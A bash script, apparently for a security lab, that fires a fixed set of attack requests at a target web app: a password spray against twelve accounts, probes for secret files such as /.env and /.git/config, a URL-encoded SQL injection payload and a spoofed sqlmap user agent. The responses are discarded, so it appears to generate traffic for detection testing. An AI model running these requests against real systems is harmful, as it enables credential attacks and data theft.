#!/bin/bash
# The same attack on every lab app. Runs in the attacker container, on a network with no way out.
T="http://$1:8080"
J='Content-Type: application/json'
for i in $(seq 1 12); do
  curl -s -o /dev/null -X POST -H "$J" -d "{\"username\":\"user$i@example.test\",\"password\":\"Winter2026\"}" "$T/auth/login"
done
curl -s -o /dev/null -X POST -H "$J" -d '{"username":"alice","password":"Summer2026!"}' "$T/auth/login"
for p in /.env /.git/config /actuator/env /wp-login.php /phpmyadmin/ /backup.sql; do curl -s -o /dev/null "$T$p"; done
for i in 1 2 3; do curl -s -o /dev/null "$T/api/items?id=1%27%20OR%20%271%27=%271"; done
curl -s -o /dev/null -A "sqlmap/1.8.2#stable (https://sqlmap.org)" "$T/api/items?id=1"
echo done
